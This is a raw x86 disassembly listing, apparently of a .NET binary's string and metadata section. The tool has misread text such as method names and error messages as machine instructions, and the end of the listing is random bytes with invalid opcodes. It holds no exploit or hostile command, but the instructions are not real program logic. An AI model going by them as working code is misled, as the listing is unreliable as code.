  403b75:	imul   ebp,DWORD PTR [edi+0x6e],0x57725400
  403b7c:	popa   
  403b7d:	jb     0x403bed
  403b7f:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  403b86:	je     0x403bed
  403b88:	ins    DWORD PTR es:[edi],dx
  403b89:	cs inc ebx
  403b8b:	outs   dx,DWORD PTR ds:[esi]
  403b8c:	ins    BYTE PTR es:[edi],dx
  403b8d:	ins    BYTE PTR es:[edi],dx
  403b8e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403b93:	outs   dx,BYTE PTR ds:[esi]
  403b94:	jae    0x403b96
  403b96:	dec    ecx
  403b97:	inc    ebp
  403b98:	outs   dx,BYTE PTR ds:[esi]
  403b99:	jne    0x403c08
  403b9b:	gs jb  0x403bff
  403b9e:	je     0x403c0f
  403ba0:	jb     0x403ba2
  403ba2:	dec    ebp
  403ba3:	outs   dx,DWORD PTR ds:[esi]
  403ba4:	jbe    0x403c0b
  403ba6:	dec    esi
  403ba7:	gs js  0x403c1e
  403baa:	add    BYTE PTR [edi+0x65],ah
  403bad:	je     0x403c0e
  403baf:	dec    ecx
  403bb0:	jae    0x403bf5
  403bb2:	popa   
  403bb3:	outs   dx,BYTE PTR ds:[esi]
  403bb4:	arpl   WORD PTR [ebp+0x6c],sp
  403bb7:	ins    BYTE PTR es:[edi],dx
  403bb8:	popa   
  403bb9:	je     0x403c24
  403bbb:	outs   dx,DWORD PTR ds:[esi]
  403bbc:	outs   dx,BYTE PTR ds:[esi]
  403bbd:	push   edx
  403bbe:	gs jno 0x403c36
  403bc1:	gs jae 0x403c38
  403bc4:	gs add BYTE PTR fs:[edi+0x62],cl
  403bc9:	push   0x65
  403bcb:	arpl   WORD PTR [esp+eax*2+0x69],si
  403bcf:	jae    0x403c41
  403bd1:	outs   dx,DWORD PTR ds:[esi]
  403bd2:	jae    0x403c39
  403bd4:	fs inc ebp
  403bd6:	js     0x403c3b
  403bd8:	gs jo  0x403c4f
  403bdb:	imul   ebp,DWORD PTR [edi+0x6e],0x67724100
  403be2:	jne    0x403c51
  403be4:	outs   dx,BYTE PTR gs:[esi]
  403be6:	je     0x403c36
  403be8:	jne    0x403c56
  403bea:	ins    BYTE PTR es:[edi],dx
  403beb:	inc    ebp
  403bec:	js     0x403c51
  403bee:	gs jo  0x403c65
  403bf1:	imul   ebp,DWORD PTR [edi+0x6e],0x61725400
  403bf8:	arpl   WORD PTR [ebp+0x41],sp
  403bfb:	outs   dx,BYTE PTR ds:[esi]
  403bfc:	fs push esp
  403bfe:	push   0x776f72
  403c03:	push   edx
  403c04:	gs jo  0x403c76
  403c07:	jb     0x403c7d
  403c09:	push   eax
  403c0a:	jb     0x403c7b
  403c0c:	addr16 jb 0x403c74
  403c0f:	jae    0x403c84
  403c11:	add    BYTE PTR [eax],al
  403c13:	add    BYTE PTR [eax],al
  403c15:	add    DWORD PTR [eax],eax
  403c17:	jno    0x403c5a
  403c19:	add    BYTE PTR [esi+0x0],ch
  403c1c:	and    BYTE PTR [eax],al
  403c1e:	jne    0x403c20
  403c20:	outs   dx,BYTE PTR ds:[esi]
  403c21:	add    BYTE PTR [ebx+0x0],ch
  403c24:	outs   dx,BYTE PTR ds:[esi]
  403c25:	add    BYTE PTR [edi+0x0],ch
  403c28:	ja     0x403c2a
  403c2a:	outs   dx,BYTE PTR ds:[esi]
  403c2b:	add    BYTE PTR [eax],ah
  403c2d:	add    BYTE PTR [ebp+0x0],ah
  403c30:	jb     0x403c32
  403c32:	jb     0x403c34
  403c34:	outs   dx,DWORD PTR ds:[esi]
  403c35:	add    BYTE PTR [edx+0x0],dh
  403c38:	and    BYTE PTR [eax],al
  403c3a:	outs   dx,DWORD PTR ds:[esi]
  403c3b:	add    BYTE PTR [ebx+0x0],ah
  403c3e:	arpl   WORD PTR [eax],ax
  403c40:	jne    0x403c42
  403c42:	jb     0x403c44
  403c44:	jb     0x403c46
  403c46:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403c4b:	add    BYTE PTR [edi+0x0],dh
  403c4e:	push   0x6c006900
  403c53:	add    BYTE PTR [ebp+0x0],ah
  403c56:	and    BYTE PTR [eax],al
  403c58:	jb     0x403c5a
  403c5a:	jne    0x403c5c
  403c5c:	outs   dx,BYTE PTR ds:[esi]
  403c5d:	add    BYTE PTR [esi+0x0],ch
  403c60:	imul   eax,DWORD PTR [eax],0x67006e
  403c66:	and    BYTE PTR [eax],al
  403c68:	je     0x403c6a
  403c6a:	push   0x20006500
  403c6f:	add    BYTE PTR [ecx+0x0],ah
  403c72:	jo     0x403c74
  403c74:	jo     0x403c76
  403c76:	ins    BYTE PTR es:[edi],dx
  403c77:	add    BYTE PTR [ecx+0x0],ch
  403c7a:	arpl   WORD PTR [eax],ax
  403c7c:	popa   
  403c7d:	add    BYTE PTR [eax+eax*1+0x69],dh
  403c81:	add    BYTE PTR [edi+0x0],ch
  403c84:	outs   dx,BYTE PTR ds:[esi]
  403c85:	add    BYTE PTR [esi],ch
  403c87:	add    BYTE PTR [eax],al
  403c89:	or     eax,0x30007b
  403c8e:	jge    0x403c90
  403c90:	jnp    0x403c92
  403c92:	xor    DWORD PTR [eax],eax
  403c94:	jge    0x403c96
  403c96:	add    BYTE PTR [ebp+0x6e],dh
  403c99:	add    BYTE PTR [ebp+0x0],ah
  403c9c:	je     0x403c9e
  403c9e:	add    BYTE PTR cs:[eax+0x0],dh
  403ca2:	imul   eax,DWORD PTR [eax],0x650070
  403ca8:	cmp    al,BYTE PTR [eax]
  403caa:	das    
  403cab:	add    BYTE PTR [edi],ch
  403cad:	add    BYTE PTR [eax+eax*1+0x6f],ch
  403cb1:	add    BYTE PTR [ebx+0x0],ah
  403cb4:	popa   
  403cb5:	add    BYTE PTR [eax+eax*1+0x68],ch
  403cb9:	add    BYTE PTR [edi+0x0],ch
  403cbc:	jae    0x403cbe
  403cbe:	je     0x403cc0
  403cc0:	das    
  403cc1:	add    BYTE PTR [ebx+0x0],al
  403cc4:	outs   dx,DWORD PTR ds:[esi]
  403cc5:	add    BYTE PTR [esi+0x0],ch
  403cc8:	arpl   WORD PTR [eax],ax
  403cca:	jne    0x403ccc
  403ccc:	jb     0x403cce
  403cce:	jb     0x403cd0
  403cd0:	add    BYTE PTR gs:[esi+0x0],ch
  403cd4:	arpl   WORD PTR [eax],ax
  403cd6:	jns    0x403cd8
  403cd8:	push   esi
  403cd9:	add    BYTE PTR [ecx+0x0],ch
  403cdc:	jae    0x403cde
  403cde:	jne    0x403ce0
  403ce0:	popa   
  403ce1:	add    BYTE PTR [eax+eax*1+0x69],ch
  403ce5:	add    BYTE PTR [edx+0x0],bh
  403ce8:	add    BYTE PTR gs:[edx+0x0],dh
  403cec:	das    
  403ced:	add    BYTE PTR [ecx+0x0],al
  403cf0:	outs   dx,BYTE PTR ds:[esi]
  403cf1:	add    BYTE PTR [ecx+0x0],ah
  403cf4:	ins    BYTE PTR es:[edi],dx
  403cf5:	add    BYTE PTR [ecx+0x0],bh
  403cf8:	jae    0x403cfa
  403cfa:	imul   eax,DWORD PTR [eax],0x530073
  403d00:	add    BYTE PTR gs:[edx+0x0],dh
  403d04:	jbe    0x403d06
  403d06:	imul   eax,DWORD PTR [eax],0x650063
  403d0c:	add    BYTE PTR [ebx],al
  403d0e:	dec    esi
  403d0f:	add    BYTE PTR [eax],al
  403d11:	and    edx,DWORD PTR [ebx+0x0]
  403d14:	add    BYTE PTR gs:[edx+0x0],dh
  403d18:	jbe    0x403d1a
  403d1a:	imul   eax,DWORD PTR [eax],0x650063
  403d20:	and    BYTE PTR [eax],al
  403d22:	push   ebp
  403d23:	add    BYTE PTR [edx+0x0],dh
  403d26:	imul   eax,DWORD PTR [eax],0x270020
  403d2c:	jnp    0x403d2e
  403d2e:	xor    BYTE PTR [eax],al
  403d30:	jge    0x403d32
  403d32:	daa    
  403d33:	add    BYTE PTR [ecx],al
  403d35:	xor    DWORD PTR [ebx+0x0],edx
  403d38:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  403d3d:	add    BYTE PTR [ecx+0x0],ch
  403d40:	outs   dx,BYTE PTR ds:[esi]
  403d41:	add    BYTE PTR [edi+0x0],ah
  403d44:	and    BYTE PTR [eax],al
  403d46:	arpl   WORD PTR [eax],ax
  403d48:	jne    0x403d4a
  403d4a:	ins    BYTE PTR es:[edi],dx
  403d4b:	add    BYTE PTR [eax+eax*1+0x75],dh
  403d4f:	add    BYTE PTR [edx+0x0],dh
  403d52:	add    BYTE PTR gs:[eax],ah
  403d55:	add    BYTE PTR [eax+eax*1+0x43],cl
  403d59:	add    BYTE PTR [ecx+0x0],cl
  403d5c:	inc    esp
  403d5d:	add    BYTE PTR ds:0x30007b00,bh
  403d63:	add    BYTE PTR [ebp+0x0],bh
  403d66:	add    BYTE PTR [ebx],dh
  403d68:	push   ebp
  403d69:	add    BYTE PTR [esi+0x0],ch
  403d6c:	popa   
  403d6d:	add    BYTE PTR [edx+0x0],ah
  403d70:	ins    BYTE PTR es:[edi],dx
  403d71:	add    BYTE PTR [ebp+0x0],ah
  403d74:	and    BYTE PTR [eax],al
  403d76:	je     0x403d78
  403d78:	outs   dx,DWORD PTR ds:[esi]
  403d79:	add    BYTE PTR [eax],ah
  403d7b:	add    BYTE PTR [eax+0x0],dh
  403d7e:	popa   
  403d7f:	add    BYTE PTR [edx+0x0],dh
  403d82:	jae    0x403d84
  403d84:	add    BYTE PTR gs:[eax],ah
  403d87:	add    BYTE PTR [ecx+0x0],ah
  403d8a:	jb     0x403d8c
  403d8c:	add    BYTE PTR [di+0x0],dh
  403d90:	ins    DWORD PTR es:[edi],dx
  403d91:	add    BYTE PTR [ebp+0x0],ah
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	add    BYTE PTR [eax+eax*1+0x73],dh
  403d99:	add    BYTE PTR [eax],al
  403d9b:	jno    0x403de6
  403d9d:	add    BYTE PTR [esi+0x0],ch
  403da0:	jbe    0x403da2
  403da2:	popa   
  403da3:	add    BYTE PTR [eax+eax*1+0x69],ch
  403da7:	add    BYTE PTR [eax+eax*1+0x20],ah
  403dab:	add    BYTE PTR [esi+0x0],ch
  403dae:	jne    0x403db0
  403db0:	ins    DWORD PTR es:[edi],dx
  403db1:	add    BYTE PTR [edx+0x0],ah
  403db4:	add    BYTE PTR gs:[edx+0x0],dh
  403db8:	and    BYTE PTR [eax],al
  403dba:	outs   dx,DWORD PTR ds:[esi]
  403dbb:	add    BYTE PTR [esi+0x0],ah
  403dbe:	and    BYTE PTR [eax],al
  403dc0:	popa   
  403dc1:	add    BYTE PTR [edx+0x0],dh
  403dc4:	add    BYTE PTR [di+0x0],dh
  403dc8:	ins    DWORD PTR es:[edi],dx
  403dc9:	add    BYTE PTR [ebp+0x0],ah
  403dcc:	outs   dx,BYTE PTR ds:[esi]
  403dcd:	add    BYTE PTR [eax+eax*1+0x73],dh
  403dd1:	add    BYTE PTR [eax],ah
  403dd3:	add    BYTE PTR [eax+eax*1+0x6f],dh
  403dd7:	add    BYTE PTR [eax],ah
  403dd9:	add    BYTE PTR [ecx+0x0],ah
  403ddc:	outs   dx,BYTE PTR ds:[esi]
  403ddd:	add    BYTE PTR [ecx+0x0],ah
  403de0:	ins    BYTE PTR es:[edi],dx
  403de1:	add    BYTE PTR [ecx+0x0],bh
  403de4:	jae    0x403de6
  403de6:	imul   eax,DWORD PTR [eax],0x200073
  403dec:	jae    0x403dee
  403dee:	add    BYTE PTR gs:[edx+0x0],dh
  403df2:	jbe    0x403df4
  403df4:	imul   eax,DWORD PTR [eax],0x650063
  403dfa:	and    BYTE PTR [eax],al
  403dfc:	jo     0x403dfe
  403dfe:	jb     0x403e00
  403e00:	outs   dx,DWORD PTR ds:[esi]
  403e01:	add    BYTE PTR [ebx+0x0],ah
  403e04:	add    BYTE PTR gs:[ebx+0x0],dh
  403e08:	jae    0x403e0a
  403e0a:	add    BYTE PTR cs:[eax],al
  403e0d:	adc    BYTE PTR [ebp+0x740053],0x6f
  403e14:	add    BYTE PTR [eax+0x0],dh
  403e17:	push   ebx
  403e18:	add    BYTE PTR [ebp+0x0],ah
  403e1b:	jb     0x403e1d
  403e1d:	jbe    0x403e1f
  403e1f:	imul   eax,DWORD PTR [eax],0x650063
  403e25:	sub    BYTE PTR [eax],al
  403e27:	sub    DWORD PTR [eax],eax
  403e29:	and    BYTE PTR [eax],al
  403e2b:	imul   eax,DWORD PTR [eax],0x200073
  403e31:	jne    0x403e33
  403e33:	outs   dx,BYTE PTR ds:[esi]
  403e34:	add    BYTE PTR [ecx+0x0],ah
  403e37:	bound  eax,QWORD PTR [eax]
  403e39:	ins    BYTE PTR es:[edi],dx
  403e3a:	add    BYTE PTR [ebp+0x0],ah
  403e3d:	and    BYTE PTR [eax],al
  403e3f:	je     0x403e41
  403e41:	outs   dx,DWORD PTR ds:[esi]
  403e42:	add    BYTE PTR [eax],ah
  403e44:	add    BYTE PTR [ebx+0x0],dh
  403e47:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  403e4c:	add    BYTE PTR [eax+eax*1+0x68],dh
  403e50:	add    BYTE PTR [ebp+0x0],ah
  403e53:	and    BYTE PTR [eax],al
  403e55:	push   esp
  403e56:	add    BYTE PTR [ecx+0x0],ah
  403e59:	jae    0x403e5b
  403e5b:	imul   eax,DWORD PTR [eax],0x43
  403e5e:	add    BYTE PTR [edi+0x0],ch
  403e61:	ins    DWORD PTR es:[edi],dx
  403e62:	add    BYTE PTR [eax+0x0],dh
  403e65:	ins    BYTE PTR es:[edi],dx
  403e66:	add    BYTE PTR [ebp+0x0],ah
  403e69:	je     0x403e6b
  403e6b:	imul   eax,DWORD PTR [eax],0x6e006f
  403e71:	push   ebx
  403e72:	add    BYTE PTR [edi+0x0],ch
  403e75:	jne    0x403e77
  403e77:	jb     0x403e79
  403e79:	arpl   WORD PTR [eax],ax
  403e7b:	add    BYTE PTR gs:[eax],ah
  403e7e:	add    BYTE PTR [eax+eax*1+0x6f],dh
  403e82:	add    BYTE PTR [eax],ah
  403e84:	add    BYTE PTR [ebx+0x0],dh
  403e87:	imul   eax,DWORD PTR [eax],0x6e0067
  403e8d:	popa   
  403e8e:	add    BYTE PTR [eax+eax*1+0x20],ch
  403e92:	add    BYTE PTR [ebx+0x0],dh
  403e95:	je     0x403e97
  403e97:	outs   dx,DWORD PTR ds:[esi]
  403e98:	add    BYTE PTR [eax+0x0],dh
  403e9b:	jo     0x403e9d
  403e9d:	imul   eax,DWORD PTR [eax],0x67006e
  403ea3:	add    BYTE PTR [eax+0x78004591],al
  403ea9:	add    BYTE PTR [ebx+0x0],ah
  403eac:	add    BYTE PTR gs:[eax+0x0],dh
  403eb0:	je     0x403eb2
  403eb2:	imul   eax,DWORD PTR [eax],0x6e006f
  403eb8:	and    BYTE PTR [eax],al
  403eba:	outs   dx,DWORD PTR ds:[esi]
  403ebb:	add    BYTE PTR [ebx+0x0],ah
  403ebe:	arpl   WORD PTR [eax],ax
  403ec0:	jne    0x403ec2
  403ec2:	jb     0x403ec4
  403ec4:	jb     0x403ec6
  403ec6:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  403ecb:	add    BYTE PTR [eax+eax*1+0x75],ah
  403ecf:	add    BYTE PTR [edx+0x0],dh
  403ed2:	imul   eax,DWORD PTR [eax],0x67006e
  403ed8:	and    BYTE PTR [eax],al
  403eda:	jo     0x403edc
  403edc:	popa   
  403edd:	add    BYTE PTR [edx+0x0],dh
  403ee0:	jae    0x403ee2
  403ee2:	imul   eax,DWORD PTR [eax],0x67006e
  403ee8:	sub    al,0x0
  403eea:	and    BYTE PTR [eax],al
  403eec:	je     0x403eee
  403eee:	push   0x6f007200
  403ef3:	add    BYTE PTR [edi+0x0],dh
  403ef6:	imul   eax,DWORD PTR [eax],0x67006e
  403efc:	and    BYTE PTR [eax],al
  403efe:	inc    esi
  403eff:	add    BYTE PTR [ecx+0x0],ah
  403f02:	jne    0x403f04
  403f04:	ins    BYTE PTR es:[edi],dx
  403f05:	add    BYTE PTR [eax+eax*1+0x45],dh
  403f09:	add    BYTE PTR [eax+0x0],bh
  403f0c:	arpl   WORD PTR [eax],ax
  403f0e:	add    BYTE PTR gs:[eax+0x0],dh
  403f12:	je     0x403f14
  403f14:	imul   eax,DWORD PTR [eax],0x6e006f
  403f1a:	cmp    al,0x0
  403f1c:	push   eax
  403f1d:	add    BYTE PTR [edx+0x0],dh
  403f20:	outs   dx,DWORD PTR ds:[esi]
  403f21:	add    BYTE PTR [esi+0x0],ah
  403f24:	imul   eax,DWORD PTR [eax],0x65006c
  403f2a:	inc    esi
  403f2b:	add    BYTE PTR [ecx+0x0],ah
  403f2e:	jne    0x403f30
  403f30:	ins    BYTE PTR es:[edi],dx
  403f31:	add    BYTE PTR [eax+eax*1+0x3e],dh
  403f35:	add    BYTE PTR [eax],al
  403f37:	inc    ebp
  403f38:	inc    ecx
  403f39:	add    BYTE PTR [esi+0x0],ch
  403f3c:	popa   
  403f3d:	add    BYTE PTR [eax+eax*1+0x79],ch
  403f41:	add    BYTE PTR [ebx+0x0],dh
  403f44:	imul   eax,DWORD PTR [eax],0x530073
  403f4a:	add    BYTE PTR gs:[edx+0x0],dh
  403f4e:	jbe    0x403f50
  403f50:	imul   eax,DWORD PTR [eax],0x650063
  403f56:	and    BYTE PTR [eax],al
  403f58:	arpl   WORD PTR [eax],ax
  403f5a:	popa   
  403f5b:	add    BYTE PTR [esi+0x0],ch
  403f5e:	arpl   WORD PTR [eax],ax
  403f60:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  403f65:	add    BYTE PTR [eax+eax*1+0x20],ah
  403f69:	add    BYTE PTR [eax+0x0],dh
  403f6c:	jb     0x403f6e
  403f6e:	outs   dx,DWORD PTR ds:[esi]
  403f6f:	add    BYTE PTR [esi+0x0],ah
  403f72:	imul   eax,DWORD PTR [eax],0x69006c
  403f78:	outs   dx,BYTE PTR ds:[esi]
  403f79:	add    BYTE PTR [edi+0x0],ah
  403f7c:	add    BYTE PTR [eax+0x6e005591],al
  403f82:	add    BYTE PTR [ebx+0x0],ch
  403f85:	outs   dx,BYTE PTR ds:[esi]
  403f86:	add    BYTE PTR [edi+0x0],ch
  403f89:	ja     0x403f8b
  403f8b:	outs   dx,BYTE PTR ds:[esi]
  403f8c:	add    BYTE PTR [eax],ah
  403f8e:	add    BYTE PTR [ebp+0x0],ah
  403f91:	js     0x403f93
  403f93:	arpl   WORD PTR [eax],ax
  403f95:	add    BYTE PTR gs:[eax+0x0],dh
  403f99:	je     0x403f9b
  403f9b:	imul   eax,DWORD PTR [eax],0x6e006f
  403fa1:	and    BYTE PTR [eax],al
  403fa3:	add    BYTE PTR fs:[ebp+0x0],dh
  403fa7:	jb     0x403fa9
  403fa9:	imul   eax,DWORD PTR [eax],0x67006e
  403faf:	and    BYTE PTR [eax],al
  403fb1:	popa   
  403fb2:	add    BYTE PTR [esi+0x0],ch
  403fb5:	popa   
  403fb6:	add    BYTE PTR [eax+eax*1+0x79],ch
  403fba:	add    BYTE PTR [ebx+0x0],dh
  403fbd:	imul   eax,DWORD PTR [eax],0x2c0073
  403fc3:	and    BYTE PTR [eax],al
  403fc5:	je     0x403fc7
  403fc7:	push   0x6f007200
  403fcc:	add    BYTE PTR [edi+0x0],dh
  403fcf:	imul   eax,DWORD PTR [eax],0x67006e
  403fd5:	and    BYTE PTR [eax],al
  403fd7:	inc    esi
  403fd8:	add    BYTE PTR [ecx+0x0],ah
  403fdb:	jne    0x403fdd
  403fdd:	ins    BYTE PTR es:[edi],dx
  403fde:	add    BYTE PTR [eax+eax*1+0x45],dh
  403fe2:	add    BYTE PTR [eax+0x0],bh
  403fe5:	arpl   WORD PTR [eax],ax
  403fe7:	add    BYTE PTR gs:[eax+0x0],dh
  403feb:	je     0x403fed
  403fed:	imul   eax,DWORD PTR [eax],0x6e006f
  403ff3:	cmp    al,0x0
  403ff5:	push   eax
  403ff6:	add    BYTE PTR [edx+0x0],dh
  403ff9:	outs   dx,DWORD PTR ds:[esi]
  403ffa:	add    BYTE PTR [esi+0x0],ah
  403ffd:	imul   eax,DWORD PTR [eax],0x65006c
  404003:	inc    esi
  404004:	add    BYTE PTR [ecx+0x0],ah
  404007:	jne    0x404009
  404009:	ins    BYTE PTR es:[edi],dx
  40400a:	add    BYTE PTR [eax+eax*1+0x3e],dh
  40400e:	add    BYTE PTR [eax],al
  404010:	adc    BYTE PTR [ebx+0x610043],0x6e
  404017:	add    BYTE PTR [ebx+0x0],ah
  40401a:	add    BYTE PTR gs:[eax+eax*1+0x28],ch
  40401f:	add    BYTE PTR [ecx],ch
  404021:	add    BYTE PTR [eax],ah
  404023:	add    BYTE PTR [edi+0x0],ch
  404026:	outs   dx,BYTE PTR ds:[esi]
  404027:	add    BYTE PTR [eax],ah
  404029:	add    BYTE PTR [ecx+0x0],al
  40402c:	outs   dx,BYTE PTR ds:[esi]
  40402d:	add    BYTE PTR [ecx+0x0],ah
  404030:	ins    BYTE PTR es:[edi],dx
  404031:	add    BYTE PTR [ecx+0x0],bh
  404034:	jae    0x404036
  404036:	imul   eax,DWORD PTR [eax],0x530073
  40403c:	add    BYTE PTR gs:[edx+0x0],dh
  404040:	jbe    0x404042
  404042:	imul   eax,DWORD PTR [eax],0x650063
  404048:	and    BYTE PTR [eax],al
  40404a:	arpl   WORD PTR [eax],ax
  40404c:	popa   
  40404d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404051:	add    BYTE PTR [ebp+0x0],ah
  404054:	add    BYTE PTR fs:[eax],ah
  404057:	add    BYTE PTR [ecx+0x0],ah
  40405a:	data16 add BYTE PTR [eax+eax*1+0x65],dh
  40405f:	add    BYTE PTR [edx+0x0],dh
  404062:	and    BYTE PTR [eax],al
  404064:	arpl   WORD PTR [eax],ax
  404066:	popa   
  404067:	add    BYTE PTR [esi+0x0],ch
  40406a:	arpl   WORD PTR [eax],ax
  40406c:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  404071:	add    BYTE PTR [ecx+0x0],ah
  404074:	je     0x404076
  404076:	imul   eax,DWORD PTR [eax],0x6e006f
  40407c:	and    BYTE PTR [eax],al
  40407e:	je     0x404080
  404080:	outs   dx,DWORD PTR ds:[esi]
  404081:	add    BYTE PTR [ebx+0x0],ch
  404084:	add    BYTE PTR gs:[esi+0x0],ch
  404088:	and    BYTE PTR [eax],al
  40408a:	ja     0x40408c
  40408c:	popa   
  40408d:	add    BYTE PTR [ebx+0x0],dh
  404090:	and    BYTE PTR [eax],al
  404092:	add    BYTE PTR fs:[ecx+0x0],ch
  404096:	jae    0x404098
  404098:	jo     0x40409a
  40409a:	outs   dx,DWORD PTR ds:[esi]
  40409b:	add    BYTE PTR [ebx+0x0],dh
  40409e:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4040a3:	add    BYTE PTR [eax],al
  4040a5:	jge    0x4040ec
  4040a7:	add    BYTE PTR [eax+0x0],bh
  4040aa:	arpl   WORD PTR [eax],ax
  4040ac:	add    BYTE PTR gs:[eax+0x0],dh
  4040b0:	je     0x4040b2
  4040b2:	imul   eax,DWORD PTR [eax],0x6e006f
  4040b8:	and    BYTE PTR [eax],al
  4040ba:	je     0x4040bc
  4040bc:	push   0x6f007200
  4040c1:	add    BYTE PTR [edi+0x0],dh
  4040c4:	outs   dx,BYTE PTR ds:[esi]
  4040c5:	add    BYTE PTR [eax],ah
  4040c7:	add    BYTE PTR [edi+0x0],dh
  4040ca:	push   0x6c006900
  4040cf:	add    BYTE PTR [ebp+0x0],ah
  4040d2:	and    BYTE PTR [eax],al
  4040d4:	arpl   WORD PTR [eax],ax
  4040d6:	popa   
  4040d7:	add    BYTE PTR [esi+0x0],ch
  4040da:	arpl   WORD PTR [eax],ax
  4040dc:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  4040e1:	add    BYTE PTR [ecx+0x0],ch
  4040e4:	outs   dx,BYTE PTR ds:[esi]
  4040e5:	add    BYTE PTR [edi+0x0],ah
  4040e8:	and    BYTE PTR [eax],al
  4040ea:	popa   
  4040eb:	add    BYTE PTR [esi+0x0],ch
  4040ee:	popa   
  4040ef:	add    BYTE PTR [eax+eax*1+0x79],ch
  4040f3:	add    BYTE PTR [ebx+0x0],dh
  4040f6:	imul   eax,DWORD PTR [eax],0x200073
  4040fc:	imul   eax,DWORD PTR [eax],0x20006e
  404102:	inc    ecx
  404103:	add    BYTE PTR [esi+0x0],ch
  404106:	popa   
  404107:	add    BYTE PTR [eax+eax*1+0x79],ch
  40410b:	add    BYTE PTR [ebx+0x0],dh
  40410e:	imul   eax,DWORD PTR [eax],0x530073
  404114:	add    BYTE PTR gs:[edx+0x0],dh
  404118:	jbe    0x40411a
  40411a:	imul   eax,DWORD PTR [eax],0x650063
  404120:	add    BYTE PTR cs:[eax],al
  404123:	adc    DWORD PTR [ebx+0x0],esp
  404126:	popa   
  404127:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40412b:	add    BYTE PTR [edx+0x0],ah
  40412e:	popa   
  40412f:	add    BYTE PTR [ebx+0x0],ah
  404132:	imul   eax,DWORD PTR [eax],0x0
  404135:	add    BYTE PTR [eax],al
  404137:	add    BYTE PTR [ebx+ebp*4+0x4dde813f],bh
  40413e:	cli    
  40413f:	inc    ebp
  404140:	stos   DWORD PTR es:[edi],eax
  404141:	data16 add BYTE PTR [ecx+edx*2+0xe3fa57],cl
  404149:	or     BYTE PTR [edi+0x19565c7a],dh
  40414f:	xor    al,0xe0
  404151:	mov    DWORD PTR [eax],ecx
  404153:	mov    al,0x3f
  404155:	pop    edi
  404156:	jg     0x404169
  404158:	aad    0xa
  40415a:	cmp    al,BYTE PTR [esi]
  40415c:	adc    eax,0x12011112
  404161:	adc    eax,0x21110603
  404166:	add    eax,DWORD PTR [esi]
  404168:	adc    ah,BYTE PTR ds:0x29120603
  40416e:	add    eax,0x1d080100
  404173:	push   cs
  404174:	add    al,0x0
  404176:	add    BYTE PTR [edx],dl
  404178:	sub    eax,0x2010005
  40417d:	sbb    eax,0x20030e
  404182:	add    DWORD PTR [esi],eax
  404184:	push   es
  404185:	adc    eax,0x2013112
  40418a:	add    eax,DWORD PTR [esi]
  40418c:	adc    dh,BYTE PTR ds:0x4020602
  404192:	and    BYTE PTR [eax],al
  404194:	adc    bh,BYTE PTR [ecx]
  404196:	or     ah,BYTE PTR [eax]
  404198:	add    eax,0x1d3d1201
  40419d:	push   cs
  40419e:	or     BYTE PTR [edx],al
  4041a0:	push   cs
  4041a1:	add    al,0x20
  4041a3:	add    DWORD PTR [ecx],eax
  4041a5:	add    al,BYTE PTR [eax+ebp*1]
  4041a8:	add    BYTE PTR [edx],dl
  4041aa:	cmp    DWORD PTR [ebx],eax
  4041ac:	push   es
  4041ad:	adc    al,BYTE PTR [ecx+0x5]
  4041b0:	and    BYTE PTR [ecx],al
  4041b2:	add    DWORD PTR [edx],edx
  4041b4:	inc    ecx
  4041b5:	add    eax,0x12010120
  4041ba:	adc    eax,0x1032006
  4041bf:	push   cs
  4041c0:	push   cs
  4041c1:	push   cs
  4041c2:	push   es
  4041c3:	and    BYTE PTR [edx],al
  4041c5:	add    DWORD PTR [ecx],edx
  4041c7:	inc    ebp
  4041c8:	add    al,BYTE PTR [esi]
  4041ca:	and    BYTE PTR [edx],al
  4041cc:	add    DWORD PTR [ecx],edx
  4041ce:	inc    ebp
  4041cf:	or     BYTE PTR [eax+eiz*1],al
  4041d2:	add    DWORD PTR [ecx],eax
  4041d4:	push   cs
  4041d5:	add    eax,0xe010220
  4041da:	push   cs
  4041db:	push   es
  4041dc:	and    BYTE PTR [ecx],al
  4041de:	add    DWORD PTR [ecx],edx
  4041e0:	adc    BYTE PTR [ebp+0x1012004],0x8
  4041e7:	and    BYTE PTR [eax+0x2400],0x4
  4041ee:	add    BYTE PTR [eax],0x0
  4041f1:	xchg   esp,eax
  4041f2:	add    BYTE PTR [eax],al
  4041f4:	add    BYTE PTR [esi],al
  4041f6:	add    al,BYTE PTR [eax]
  4041f8:	add    BYTE PTR [eax],al
  4041fa:	and    al,0x0
  4041fc:	add    BYTE PTR [edx+0x53],dl
  4041ff:	inc    ecx
  404200:	xor    DWORD PTR [eax],eax
  404202:	add    al,0x0
  404204:	add    BYTE PTR [ecx],al
  404206:	add    BYTE PTR [ecx],al
  404208:	add    BYTE PTR [edi],al
  40420a:	sar    edx,1
  40420c:	push   edi
  40420d:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  404213:	test   BYTE PTR [edx+0xdfdae0f],ch
  404219:	jmp    0xecab4006
  40421e:	pop    DWORD PTR [edi+0x6c7603fb]
  404224:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  404229:	mov    dl,0x3b
  40422b:	out    0x9a,eax
  40422d:	(bad)  
  40422f:	fadd   st(1),st
  404231:	fstp   QWORD PTR [edx+0x211336d2]
  404237:	add    dl,BYTE PTR [eax-0x6c38df5]
  40423d:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  404244:	pop    esi
  404246:	pop    es
  404247:	ja     0x404298
  404249:	sub    eax,ebp
  40424b:	xor    cl,BYTE PTR [esi]
  40424d:	xchg   edx,eax
  40424e:	jmp    0xc021:0xe8e4ec05
  404255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404256:	out    dx,eax
  404257:	call   0x4c9ca74d
  40425c:	or     al,0x93
  40425e:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  404265:	stos   BYTE PTR es:[edi],al
  404266:	gs sub al,0x1d
  404269:	cli    
  40426a:	(bad)  
  40426b:	cmp    eax,0x2d6f5d74
  404270:	in     eax,0xf1
  404272:	jle    0x4042d2
  404274:	scas   eax,DWORD PTR es:[edi]
